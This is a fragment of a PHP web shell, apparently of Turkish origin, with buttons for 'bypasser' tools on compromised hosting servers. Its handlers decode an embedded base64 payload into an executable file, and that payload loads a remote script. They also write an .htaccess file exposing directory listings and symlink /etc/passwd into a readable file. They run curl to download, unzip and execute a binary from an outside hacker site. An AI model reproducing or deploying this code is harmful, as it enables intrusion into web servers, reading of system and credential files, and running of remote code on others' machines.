lcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250PjwvYT48L3A+JzsNCn0NCn0NCiBwcmludCINCjxTQ1JJUFQgU1JDPWh0dHA6Ly9vZi13b3JsZC5jb20vaW1hZ2VzL2ltZy9sb2cuanM+PC9TQ1JJUFQ+IA0KPC9ib2R5Pg0KPC9odG1sPiI7';

$file = fopen("config.izo" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
    chmod("config.izo",0755);
   echo "http://configler/config.izo ";
}
if (isset($_POST['Submit15']))
{
    mkdir('oku', 0755);
    chdir('oku');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options all
DirectoryIndex 1.txt";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd 1.txt');
@exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip');
@exec('unzip ln.zip');
@exec('chmod 755 ln');
@exec('./ln -s /etc/passwd 1.txt');
   echo "http://oku/1.txt ";
}
?>
  <tr>
    <td><table width='100%' height='173'>
      <tr>
        <th class='td' style='border-bottom-width:thin;border-top-width:thin'><div align='right'><span class='style1'>Tools :</span></div></th>
        <td class='td' style='border-bottom-width:thin;border-top-width:thin'><form name='F1' method='post'>
            <div align='left'>
              <input type='submit' name='Submit2'  value='ln -s bypassed tüm dizinler'>
              <input type='submit' name='Submit11' value='Config Bypasser'>
			  <input type='submit' name='Submit12' value='Perl ln -s Symlink Bypasser'>
			  <input type='submit' name='Submit13' value='Cgitelnet bypassr'>
			  <input type='submit' name='Submit14' value='Python shell  Bypasser'>
			  <input type='submit' name='Submit15' value='Directory Bypasser(example /etc/passwd)'>
            </div>
        </form></td>
      </tr>
   <tr>

</body>
</html>